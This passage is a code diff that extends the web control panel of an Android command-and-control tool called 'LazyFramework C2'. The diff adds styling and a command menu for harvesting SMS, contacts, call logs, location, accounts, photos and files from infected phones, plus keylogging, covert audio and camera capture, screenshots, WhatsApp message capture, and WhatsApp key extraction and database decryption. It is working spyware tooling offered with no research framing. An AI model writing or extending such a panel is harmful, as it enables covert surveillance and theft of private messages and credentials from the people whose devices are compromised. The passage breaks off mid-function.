@@ -5,12 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>LazyFramework C2 - Dashboard</title>
     <style>
+        /* ==================== RESET & BASE ==================== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: #f5f5f5;
             color: #333;
         }
+
+        /* ==================== NAVBAR ==================== */
         .navbar {
             background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
             color: white;
@@ -19,225 +22,703 @@
             justify-content: space-between;
             align-items: center;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
         .navbar h1 { font-size: 24px; }
-        .navbar-right { display: flex; gap: 20px; align-items: center; }
+        .navbar h1 span { font-weight: 300; color: #a8c8ff; }
+        .navbar-right {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
         .status-badge {
             background: #4caf50;
             padding: 5px 15px;
             border-radius: 20px;
             font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .status-badge .dot {
+            width: 8px;
+            height: 8px;
+            background: #fff;
+            border-radius: 50%;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
         }
         .logout-btn {
-            background: rgba(255,255,255,0.2);
+            background: rgba(255,255,255,0.15);
             color: white;
-            border: none;
-            padding: 8px 15px;
+            border: 1px solid rgba(255,255,255,0.2);
+            padding: 8px 18px;
             border-radius: 5px;
             cursor: pointer;
+            transition: all 0.3s;
+            font-size: 14px;
         }
-        .container { max-width: 1400px; margin: 20px auto; padding: 0 20px; }
+        .logout-btn:hover {
+            background: rgba(255,255,255,0.25);
+            border-color: rgba(255,255,255,0.4);
+        }
+
+        /* ==================== CONTAINER ==================== */
+        .container {
+            max-width: 1440px;
+            margin: 20px auto;
+            padding: 0 20px;
+        }
+
+        /* ==================== STATS ==================== */
         .stats {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
             gap: 20px;
             margin-bottom: 30px;
         }
         .stat-card {
             background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            padding: 20px 25px;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            transition: transform 0.2s, box-shadow 0.2s;
+            border-left: 4px solid #2a5298;
         }
-        .stat-card h3 { color: #666; font-size: 14px; margin-bottom: 10px; }
-        .stat-card .number { font-size: 32px; font-weight: bold; color: #2a5298; }
+        .stat-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 4px 16px rgba(0,0,0,0.12);
+        }
+        .stat-card h3 {
+            color: #888;
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+        .stat-card .number {
+            font-size: 32px;
+            font-weight: 700;
+            color: #1e3c72;
+        }
+        .stat-card .sub {
+            font-size: 12px;
+            color: #aaa;
+            margin-top: 4px;
+        }
+        .stat-card.green { border-left-color: #4caf50; }
+        .stat-card.orange { border-left-color: #ff9800; }
+        .stat-card.purple { border-left-color: #9c27b0; }
+
+        /* ==================== SECTION HEADER ==================== */
         .section-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 10px;
         }
+        .section-header h2 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1e3c72;
+        }
+        .section-header .actions {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        /* ==================== BUTTONS ==================== */
         .btn {
             background: #2a5298;
             color: white;
             border: none;
-            padding: 8px 15px;
-            border-radius: 5px;
+            padding: 8px 16px;
+            border-radius: 6px;
             cursor: pointer;
             font-size: 14px;
-            transition: background 0.3s;
+            font-weight: 500;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
         }
-        .btn:hover { background: #1e3c72; }
-        .btn-sm { padding: 5px 10px; font-size: 12px; }
+        .btn:hover { background: #1e3c72; transform: translateY(-1px); box-shadow: 0 2px 8px rgba(42,82,152,0.3); }
+        .btn:active { transform: translateY(0); }
+        .btn-sm { padding: 5px 12px; font-size: 12px; }
+        .btn-success { background: #4caf50; }
+        .btn-success:hover { background: #388e3c; }
+        .btn-danger { background: #f44336; }
+        .btn-danger:hover { background: #c62828; }
+        .btn-warning { background: #ff9800; }
+        .btn-warning:hover { background: #e65100; }
+        .btn-outline {
+            background: transparent;
+            color: #2a5298;
+            border: 2px solid #2a5298;
+        }
+        .btn-outline:hover { background: #2a5298; color: white; }
+
+        /* ==================== AGENTS TABLE ==================== */
         .agents-table {
             background: white;
-            border-radius: 8px;
+            border-radius: 10px;
             overflow: hidden;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
             margin-bottom: 30px;
         }
-        .agents-table table { width: 100%; border-collapse: collapse; }
-        .agents-table thead { background: #f9f9f9; border-bottom: 2px solid #eee; }
-        .agents-table th { padding: 15px; text-align: left; font-weight: 600; color: #666; }
-        .agents-table td { padding: 15px; border-bottom: 1px solid #eee; }
-        .agents-table tr:hover { background: #f9f9f9; }
-        .status-online { color: #4caf50; }
-        .action-buttons { display: flex; gap: 5px; flex-wrap: wrap; }
+        .agents-table table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        .agents-table thead {
+            background: #f8f9fa;
+            border-bottom: 2px solid #e9ecef;
+        }
+        .agents-table th {
+            padding: 14px 16px;
+            text-align: left;
+            font-weight: 600;
+            font-size: 13px;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+        .agents-table td {
+            padding: 14px 16px;
+            border-bottom: 1px solid #f0f0f0;
+            vertical-align: middle;
+            font-size: 14px;
+        }
+        .agents-table tr:hover { background: #f8f9fa; }
+        .agents-table tr:last-child td { border-bottom: none; }
+        .agents-table .agent-id {
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            color: #555;
+            background: #f5f5f5;
+            padding: 2px 8px;
+            border-radius: 4px;
+        }
+        .status-online {
+            color: #4caf50;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .status-online::before {
+            content: '';
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #4caf50;
+            border-radius: 50%;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        .status-offline {
+            color: #f44336;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .status-offline::before {
+            content: '';
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #f44336;
+            border-radius: 50%;
+        }
+
+        /* ==================== ACTION BUTTONS ==================== */
+        .action-buttons {
+            display: flex;
+            gap: 4px;
+            flex-wrap: wrap;
+        }
         .action-buttons button {
-            background: #2a5298;
-            color: white;
+            background: #e9ecef;
+            color: #495057;
             border: none;
-            padding: 5px 10px;
-            border-radius: 3px;
+            padding: 4px 10px;
+            border-radius: 4px;
             cursor: pointer;
             font-size: 11px;
+            transition: all 0.2s;
         }
-        .action-buttons button:hover { background: #1e3c72; }
+        .action-buttons button:hover {
+            background: #2a5298;
+            color: white;
+        }
+        .action-buttons button.cmd { background: #2a5298; color: white; }
+        .action-buttons button.cmd:hover { background: #1e3c72; }
+        .action-buttons button.ping { background: #6c757d; color: white; }
+        .action-buttons button.ping:hover { background: #495057; }
+
+        /* ==================== MODAL ==================== */
         .modal {
             display: none;
             position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0,0,0,0.5);
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
             z-index: 1000;
             align-items: center;
             justify-content: center;
+            backdrop-filter: blur(4px);
         }
         .modal.active { display: flex; }
         .modal-content {
             background: white;
             padding: 30px;
-            border-radius: 8px;
-            max-width: 700px;
-            width: 100%;
-            max-height: 80vh;
+            border-radius: 12px;
+            max-width: 750px;
+            width: 95%;
+            max-height: 85vh;
             overflow-y: auto;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: slideIn 0.3s ease;
         }
-        .modal-close { float: right; cursor: pointer; font-size: 24px; color: #666; }
-        .form-group { margin-bottom: 15px; }
-        .form-group label { display: block; margin-bottom: 5px; font-weight: 600; }
-        .form-group input, .form-group textarea, .form-group select {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 14px;
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(-30px) scale(0.95); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
         }
-        .form-group textarea { resize: vertical; min-height: 100px; }
-        .modal-actions { text-align: right; margin-top: 20px; }
-        .modal-actions button { margin-left: 10px; }
-        .result-item {
-            padding: 15px;
-            border-bottom: 1px solid #eee;
-            background: #fafafa;
-            border-radius: 5px;
-            margin-bottom: 10px;
-        }
-        .result-header {
+        .modal-header {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 10px;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #f0f0f0;
         }
-        .result-command { font-weight: 600; color: #2a5298; }
-        .result-time { color: #999; font-size: 12px; }
-        .result-content {
-            background: white;
-            padding: 10px;
-            border-radius: 3px;
-            font-family: monospace;
+        .modal-header h2 {
+            font-size: 22px;
+            color: #1e3c72;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .modal-close {
+            cursor: pointer;
+            font-size: 28px;
+            color: #aaa;
+            transition: color 0.2s;
+            line-height: 1;
+        }
+        .modal-close:hover { color: #333; }
+
+        /* ==================== FORM ==================== */
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            color: #333;
+            font-size: 14px;
+        }
+        .form-group label .required {
+            color: #f44336;
+            margin-left: 2px;
+        }
+        .form-group input,
+        .form-group textarea,
+        .form-group select {
+            width: 100%;
+            padding: 10px 14px;
+            border: 2px solid #e9ecef;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: border-color 0.2s;
+            font-family: inherit;
+        }
+        .form-group input:focus,
+        .form-group textarea:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #2a5298;
+        }
+        .form-group textarea {
+            resize: vertical;
+            min-height: 80px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+        }
+        .form-group select {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23666' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 14px center;
+            padding-right: 36px;
+        }
+        .form-group .hint {
             font-size: 12px;
-            max-height: 300px;
+            color: #888;
+            margin-top: 4px;
+        }
+        .modal-actions {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 2px solid #f0f0f0;
+        }
+
+        /* ==================== RESULTS ==================== */
+        .result-item {
+            padding: 15px;
+            background: #fafafa;
+            border-radius: 8px;
+            margin-bottom: 12px;
+            border-left: 4px solid #2a5298;
+        }
+        .result-item .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            flex-wrap: wrap;
+            gap: 5px;
+        }
+        .result-item .command {
+            font-weight: 600;
+            color: #2a5298;
+            font-size: 14px;
+        }
+        .result-item .time {
+            color: #999;
+            font-size: 12px;
+        }
+        .result-item .content {
+            background: white;
+            padding: 12px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            max-height: 250px;
             overflow-y: auto;
             white-space: pre-wrap;
+            word-break: break-all;
+            border: 1px solid #e9ecef;
         }
+        .result-item .content .status-success { color: #4caf50; }
+        .result-item .content .status-error { color: #f44336; }
+        .result-item .content .status-warning { color: #ff9800; }
+
+        /* ==================== GALLERY ==================== */
         .gallery-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
             gap: 15px;
-            margin-top: 10px;
+            margin-top: 15px;
         }
         .gallery-item {
-            border: 1px solid #ddd;
+            border: 1px solid #e9ecef;
             border-radius: 8px;
-            padding: 10px;
+            padding: 12px;
             text-align: center;
             background: #fafafa;
+            transition: all 0.2s;
+        }
+        .gallery-item:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
         .gallery-item img {
             width: 100%;
-            height: 150px;
+            height: 160px;
             object-fit: cover;
-            border-radius: 5px;
+            border-radius: 4px;
             cursor: pointer;
         }
-        .gallery-item .info { font-size: 12px; margin-top: 8px; }
+        .gallery-item .info {
+            font-size: 12px;
+            margin-top: 8px;
+            color: #666;
+        }
+        .gallery-item .info .filename {
+            font-weight: 600;
+            color: #333;
+            word-break: break-all;
+        }
+        .gallery-item .info .size {
+            color: #999;
+        }
+        .file-icon {
+            font-size: 48px;
+            padding: 30px 0;
+        }
+
+        /* ==================== SPINNER ==================== */
         .spinner {
             display: inline-block;
-            width: 20px;
-            height: 20px;
+            width: 24px;
+            height: 24px;
             border: 3px solid #f3f3f3;
             border-top: 3px solid #2a5298;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            animation: spin 0.8s linear infinite;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #666;
+            padding: 20px;
+        }
+
+        /* ==================== STEPS / INSTRUCTION ==================== */
+        .steps-box {
+            padding: 20px;
+            background: #e3f2fd;
+            border-radius: 8px;
+            border-left: 4px solid #2a5298;
+            margin-bottom: 15px;
+        }
+        .steps-box h4 {
+            color: #1e3c72;
+            margin-bottom: 10px;
+        }
+        .steps-box ol {
+            margin-left: 20px;
+            line-height: 1.8;
+        }
+        .steps-box ol li {
+            color: #333;
+        }
+        .steps-box .highlight {
+            background: #fff3cd;
+            padding: 2px 8px;
+            border-radius: 3px;
+            font-weight: 600;
+        }
+
+        /* ==================== RESPONSIVE ==================== */
         @media (max-width: 768px) {
-            .action-buttons { flex-direction: column; }
-            .agents-table { overflow-x: auto; }
+            .navbar {
+                flex-direction: column;
+                gap: 10px;
+                padding: 15px;
+            }
+            .navbar-right {
+                width: 100%;
+                justify-content: space-between;
+            }
+            .stats {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .stat-card .number {
+                font-size: 24px;
+            }
+            .agents-table {
+                overflow-x: auto;
+            }
+            .agents-table table {
+                font-size: 13px;
+                min-width: 700px;
+            }
+            .agents-table th,
+            .agents-table td {
+                padding: 10px 12px;
+            }
+            .action-buttons {
+                gap: 3px;
+            }
+            .action-buttons button {
+                padding: 3px 7px;
+                font-size: 10px;
+            }
+            .modal-content {
+                padding: 20px;
+                max-width: 100%;
+                margin: 10px;
+                max-height: 90vh;
+            }
+            .gallery-grid {
+                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            }
+            .section-header {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .section-header .actions {
+                justify-content: stretch;
+            }
+            .section-header .actions .btn {
+                flex: 1;
+                justify-content: center;
+            }
         }
+        @media (max-width: 480px) {
+            .stats {
+                grid-template-columns: 1fr;
+            }
+            .modal-actions {
+                flex-direction: column;
+            }
+            .modal-actions .btn {
+                justify-content: center;
+            }
+        }
+
+        /* ==================== UTILITY ==================== */
+        .text-center { text-align: center; }
+        .text-muted { color: #999; }
+        .mt-10 { margin-top: 10px; }
+        .mb-10 { margin-bottom: 10px; }
+        .flex { display: flex; }
+        .flex-center { display: flex; align-items: center; justify-content: center; }
+        .gap-10 { gap: 10px; }
+        .gap-5 { gap: 5px; }
+        .flex-wrap { flex-wrap: wrap; }
+        .w-100 { width: 100%; }
+
+        /* Scrollbar styling */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #f1f1f1; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb { background: #c1c1c1; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #a8a8a8; }
     </style>
 </head>
 <body>
-    <div class="navbar">
-        <h1>🎯 LazyFramework C2 Control Panel</h1>
+
+    <!-- ==================== NAVBAR ==================== -->
+    <nav class="navbar">
+        <h1>🎯 LazyFramework <span>C2</span></h1>
         <div class="navbar-right">
-            <div class="status-badge" id="serverStatus">🟢 Online</div>
-            <button class="logout-btn" onclick="logout()">Logout</button>
+            <div class="status-badge" id="serverStatus">
+                <span class="dot"></span> Online
+            </div>
+            <button class="logout-btn" onclick="logout()">🚪 Logout</button>
         </div>
-    </div>
+    </nav>
+
+    <!-- ==================== MAIN CONTAINER ==================== -->
     <div class="container">
+
+        <!-- Stats -->
         <div class="stats">
-            <div class="stat-card"><h3>Connected Agents</h3><div class="number" id="agentCount">0</div></div>
-            <div class="stat-card"><h3>Pending Commands</h3><div class="number" id="pendingCount">0</div></div>
-            <div class="stat-card"><h3>Total Results</h3><div class="number" id="resultCount">0</div></div>
+            <div class="stat-card">
+                <h3>👥 Connected Agents</h3>
+                <div class="number" id="agentCount">0</div>
+                <div class="sub">Online & ready</div>
+            </div>
+            <div class="stat-card orange">
+                <h3>⏳ Pending Commands</h3>
+                <div class="number" id="pendingCount">0</div>
+                <div class="sub">Waiting for execution</div>
+            </div>
+            <div class="stat-card purple">
+                <h3>📊 Total Results</h3>
+                <div class="number" id="resultCount">0</div>
+                <div class="sub">Collected data</div>
+            </div>
+            <div class="stat-card green">
+                <h3>💾 Storage</h3>
+                <div class="number" id="storageCount">0</div>
+                <div class="sub">MB used</div>
+            </div>
         </div>
+
+        <!-- Agents Section -->
         <div class="section-header">
-            <h2>Connected Agents</h2>
-            <button class="btn" onclick="refreshAgents()">🔄 Refresh</button>
+            <h2>📡 Connected Agents</h2>
+            <div class="actions">
+                <button class="btn" onclick="refreshAgents()">🔄 Refresh</button>
+                <button class="btn btn-success" onclick="selectAllAgents()">✅ Select All</button>
+                <button class="btn btn-outline" onclick="showHelp()">❓ Help</button>
+            </div>
         </div>
+
+        <!-- Agents Table -->
         <div class="agents-table">
             <table>
-                <thead><tr><th>Agent ID</th><th>Device</th><th>Android</th><th>Last Seen</th><th>Status</th><th>Actions</th></tr></thead>
-                <tbody id="agentsTableBody"><tr><td colspan="6" style="text-align:center;">Loading...</td></tr></tbody>
+                <thead>
+                    <tr>
+                        <th style="width:30px;">
+                            <input type="checkbox" id="selectAllCheckbox" onchange="toggleAllAgents()">
+                        </th>
+                        <th>Agent ID</th>
+                        <th>Device</th>
+                        <th>Android</th>
+                        <th>Last Seen</th>
+                        <th>Status</th>
+                        <th style="min-width:200px;">Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="agentsTableBody">
+                    <tr>
+                        <td colspan="7" class="text-center text-muted" style="padding:40px;">
+                            <div class="spinner"></div>
+                            <br><br>Loading agents...
+                        </td>
+                    </tr>
+                </tbody>
             </table>
         </div>
+
+        <!-- Footer -->
+        <div style="text-align:center;padding:20px;color:#999;font-size:12px;border-top:1px solid #e9ecef;">
+            LazyFramework C2 v1.0 &bull; Built with ❤️ &bull; 
+            <span id="serverTime"></span>
+        </div>
     </div>
-    
-    <!-- Command Modal -->
+
+    <!-- ==================== COMMAND MODAL ==================== -->
     <div class="modal" id="commandModal">
         <div class="modal-content">
-            <span class="modal-close" onclick="closeModal('commandModal')">&times;</span>
-            <h2>Execute Command</h2>
+            <div class="modal-header">
+                <h2>⚡ Execute Command</h2>
+                <span class="modal-close" onclick="closeModal('commandModal')">&times;</span>
+            </div>
             <form id="commandForm" onsubmit="executeCommand(event)">
                 <input type="hidden" id="targetAgentId">
+
                 <div class="form-group">
-                    <label for="commandSelect">Command</label>
+                    <label>Target Agent <span class="required">*</span></label>
+                    <input type="text" id="targetAgentDisplay" readonly style="background:#f5f5f5;font-family:monospace;">
+                </div>
+
+                <div class="form-group">
+                    <label for="commandSelect">Command <span class="required">*</span></label>
                     <select id="commandSelect" required>
-                        <option value="">Select a command...</option>
-                        <optgroup label="Information">
+                        <option value="">— Select a command —</option>
+
+                        <optgroup label="📱 Device Information">
                             <option value="GET_DEVICE_INFO">GET_DEVICE_INFO</option>
                             <option value="GET_LOCATION">GET_LOCATION</option>
                             <option value="GET_CLIPBOARD">GET_CLIPBOARD</option>
                             <option value="GET_INSTALLED_APPS">GET_INSTALLED_APPS</option>
+                            <option value="GET_ACCOUNTS">GET_ACCOUNTS</option>
+                            <option value="GET_GOOGLE_ACCOUNTS">GET_GOOGLE_ACCOUNTS</option>
+                        </optgroup>
+
+                        <optgroup label="📂 Data Collection">
                             <option value="GET_CONTACTS">GET_CONTACTS</option>
                             <option value="GET_SMS">GET_SMS</option>
                             <option value="GET_CALL_LOGS">GET_CALL_LOGS</option>
                             <option value="GET_GALLERY">GET_GALLERY</option>
                             <option value="GET_FILES_LIST">GET_FILES_LIST</option>
-                            <option value="GET_ACCOUNTS">GET_ACCOUNTS</option>
-                            <option value="GET_GOOGLE_ACCOUNTS">GET_GOOGLE_ACCOUNTS</option>
                         </optgroup>
-                        <optgroup label="WhatsApp">
+
+                        <optgroup label="💬 WhatsApp">
                             <option value="WA_INFO">WA_INFO</option>
                             <option value="WA_CONTACTS">WA_CONTACTS</option>
                             <option value="WA_CAPTURE_START">WA_CAPTURE_START</option>
@@ -245,53 +726,87 @@
                             <option value="WA_CAPTURE_DUMP">WA_CAPTURE_DUMP</option>
                             <option value="WA_CAPTURE_STATS">WA_CAPTURE_STATS</option>
                             <option value="WA_CAPTURE_CLEAR">WA_CAPTURE_CLEAR</option>
+                            <option value="WA_BACKUP_INFO">WA_BACKUP_INFO</option>
+                            <option value="WA_EXTRACT_KEY">WA_EXTRACT_KEY</option>
+                            <option value="WA_DECRYPT_DB">WA_DECRYPT_DB</option>
                         </optgroup>
-                        <optgroup label="Media">
+
+                        <optgroup label="🎥 Media">
                             <option value="RECORD_AUDIO">RECORD_AUDIO</option>
                             <option value="STOP_RECORDING">STOP_RECORDING</option>
                             <option value="CAMERA_SNAPSHOT">CAMERA_SNAPSHOT</option>
                             <option value="SCREENSHOT">SCREENSHOT</option>
                             <option value="SET_WALLPAPER">SET_WALLPAPER</option>
                         </optgroup>
-                        <optgroup label="Keylogger">
+
+                        <optgroup label="⌨️ Keylogger">
                             <option value="KEYLOG_START">KEYLOG_START</option>
                             <option value="KEYLOG_STOP">KEYLOG_STOP</option>
                             <option value="KEYLOG_DUMP">KEYLOG_DUMP</option>
                         </optgroup>
-                        <optgroup label="Other">
+
+                        <optgroup label="⚙️ Other">
                             <option value="SHOW_TOAST">SHOW_TOAST</option>
                             <option value="HELP">HELP</option>
                         </optgroup>
                     </select>
+                    <div class="hint">💡 Select a command to execute on the target agent</div>
                 </div>
-                <div class="form-group">
-                    <label for="commandParams">Parameters (for SET_WALLPAPER: URL or image path)</label>
-                    <textarea id="commandParams" placeholder="https://example.com/image.jpg"></textarea>
+
+                <div class="form-group" id="paramsGroup">
+                    <label for="commandParams">Parameters <span style="color:#999;font-weight:400;">(optional)</span></label>
+                    <textarea id="commandParams" placeholder='For SET_WALLPAPER: enter image URL or base64 data&#10;Example: https://example.com/image.jpg'></textarea>
+                    <div class="hint">📌 Used for commands like SET_WALLPAPER that require additional data</div>
                 </div>
+
                 <div class="modal-actions">
-                    <button type="button" class="btn" onclick="closeModal('commandModal')">Cancel</button>
-                    <button type="submit" class="btn">Execute</button>
+                    <button type="button" class="btn btn-outline" onclick="closeModal('commandModal')">Cancel</button>
+                    <button type="submit" class="btn">🚀 Execute</button>
                 </div>
             </form>
         </div>
     </div>
-    
-    <!-- Results Modal -->
+
+    <!-- ==================== RESULTS MODAL ==================== -->
     <div class="modal" id="resultsModal">
         <div class="modal-content">
-            <span class="modal-close" onclick="closeModal('resultsModal')">&times;</span>
-            <h2>Results</h2>
-            <div id="resultsContainer">Loading...</div>
+            <div class="modal-header">
+                <h2>📊 Results</h2>
+                <span class="modal-close" onclick="closeModal('resultsModal')">&times;</span>
+            </div>
+            <div id="resultsContainer">
+                <div class="loading-text">
+                    <div class="spinner"></div>
+                    Loading results...
+                </div>
+            </div>
         </div>
     </div>
-    
+
+    <!-- ==================== JAVASCRIPT ==================== -->
     <script>
+        // ==================== VARIABLES ====================
         let currentAgentId = null;
-        setInterval(updateStats, 3000);
-        setInterval(refreshAgents, 5000);
-        updateStats();
-        refreshAgents();
-        
+        let selectedAgents = new Set();
+        let autoRefreshInterval = null;
+
+        // ==================== INIT ====================
+        document.addEventListener('DOMContentLoaded', function() {
+            updateStats();
+            refreshAgents();
+            updateServerTime();
+
+            // Auto refresh every 5 seconds
+            autoRefreshInterval = setInterval(function() {
+                updateStats();
+                refreshAgents();
+            }, 5000);
+
+            // Update server time every second
+            setInterval(updateServerTime, 1000);
+        });
+
+        // ==================== STATS ====================
         function updateStats() {
             fetch('/api/status')
                 .then(r => r.json())
@@ -299,237 +814,679 @@
                     document.getElementById('agentCount').textContent = data.agents_connected || 0;
                     document.getElementById('pendingCount').textContent = data.pending_commands || 0;
                     document.getElementById('resultCount').textContent = data.total_results || 0;
-                }).catch(() => {});
+
+                    // Estimate storage
+                    let storage = 0;
+                    fetch('/api/stats')
+                        .then(r => r.json())
+                        .then(stats => {
+                            storage = stats.storage_mb || 0;
+                            document.getElementById('storageCount').textContent = storage.toFixed(1);
+                        })
+                        .catch(() => {
+                            document.getElementById('storageCount').textContent = '0';
+                        });
+                })
+                .catch(() => {});
         }
-        
+
+        function updateServerTime() {
+            const now = new Date();
+            document.getElementById('serverTime').textContent = now.toLocaleString();
+        }
+
+        // ==================== AGENTS ====================
         function refreshAgents() {
             fetch('/api/agents')
                 .then(r => r.json())
                 .then(agents => {
                     const tbody = document.getElementById('agentsTableBody');
-                    if (agents.length === 0) {
-                        tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">No agents connected</td></tr>';
+
+                    if (!agents || agents.length === 0) {
+                        tbody.innerHTML = `
+                            <tr>
+                                <td colspan="7" class="text-center text-muted" style="padding:40px;">
+                                    <div style="font-size:48px;margin-bottom:10px;">📡</div>
+                                    <strong>No agents connected</strong>
+                                    <br><span style="font-size:13px;">Waiting for agent to connect...</span>
+                                </td>
+                            </tr>
+                        `;
                         return;
                     }
-                    tbody.innerHTML = agents.map(agent => `
-                        <tr>
-                            <td><code>${agent.agent_id.substring(0, 16)}...</code></td>
-                            <td>${agent.device || 'Unknown'}</td>
-                            <td>${agent.android_version || 'Unknown'}</td>
-                            <td>${new Date(agent.last_seen).toLocaleString()}</td>
-                            <td><span class="status-online">● Online</span></td>
-                            <td>
-                                <div class="action-buttons">
-                                    <button onclick="openCommandModal('${agent.agent_id}')">Cmd</button>
-                                    <button onclick="viewResults('${agent.agent_id}')">📊</button>
-                                    <button onclick="viewPhotos('${agent.agent_id}')">📷</button>
-                                    <button onclick="viewScreenshots('${agent.agent_id}')">🖼️</button>
-                                    <button onclick="viewDownloads('${agent.agent_id}')">💾</button>
-                                    <button onclick="viewWhatsApp('${agent.agent_id}')">💬</button>
-                                    <button onclick="pingAgent('${agent.agent_id}')">Ping</button>
-                                </div>
-                            </td>
-                        </tr>
-                    `).join('');
-                }).catch(() => {});
+
+                    let html = '';
+                    agents.forEach(agent => {
+                        const isSelected = selectedAgents.has(agent.agent_id);
+                        const agentIdShort = agent.agent_id.substring(0, 16) + '...';
+                        const lastSeen = new Date(agent.last_seen).toLocaleString();
+                        const statusClass = agent.online ? 'status-online' : 'status-offline';
+                        const statusText = agent.online ? 'Online' : 'Offline';
+
+                        html += `
+                            <tr>
+                                <td>
+                                    <input type="checkbox" class="agent-checkbox" 
+                                           value="${agent.agent_id}" 
+                                           ${isSelected ? 'checked' : ''}
+                                           onchange="toggleAgent('${agent.agent_id}')">
+                                </td>
+                                <td>
+                                    <span class="agent-id" title="${agent.agent_id}">${agentIdShort}</span>
+                                </td>
+                                <td>${agent.device || 'Unknown'}</td>
+                                <td>${agent.android_version || 'Unknown'}</td>
+                                <td>${lastSeen}</td>
+                                <td><span class="${statusClass}">${statusText}</span></td>
+                                <td>
+                                    <div class="action-buttons">
+                                        <button class="cmd" onclick="openCommandModal('${agent.agent_id}')" title="Send Command">⚡</button>
+                                        <button onclick="viewResults('${agent.agent_id}')" title="View Results">📊</button>
+                                        <button onclick="viewPhotos('${agent.agent_id}')" title="Photos">📷</button>
+                                        <button onclick="viewScreenshots('${agent.agent_id}')" title="Screenshots">🖼️</button>
+                                        <button onclick="viewDownloads('${agent.agent_id}')" title="Downloads">💾</button>
+                                        <button onclick="viewWhatsApp('${agent.agent_id}')" title="WhatsApp">💬</button>
+                                        <button onclick="viewWhatsAppDecrypt('${agent.agent_id}')" title="WhatsApp Decrypt">🔓</button>
+                                        <button class="ping" onclick="pingAgent('${agent.agent_id}')" title="Ping Agent">📶</button>
+                                    </div>
+                                </td>
+                            </tr>
+                        `;
+                    });
+
+                    tbody.innerHTML = html;
+                })
+                .catch(err => {
+                    console.error('Refresh agents error:', err);
+                });
         }
-        
+
+        // ==================== AGENT SELECTION ====================
+        function toggleAgent(agentId) {
+            if (selectedAgents.has(agentId)) {
+                selectedAgents.delete(agentId);
+            } else {
+                selectedAgents.add(agentId);
+            }
+            updateSelectAllState();
+        }
+
+        function toggleAllAgents() {
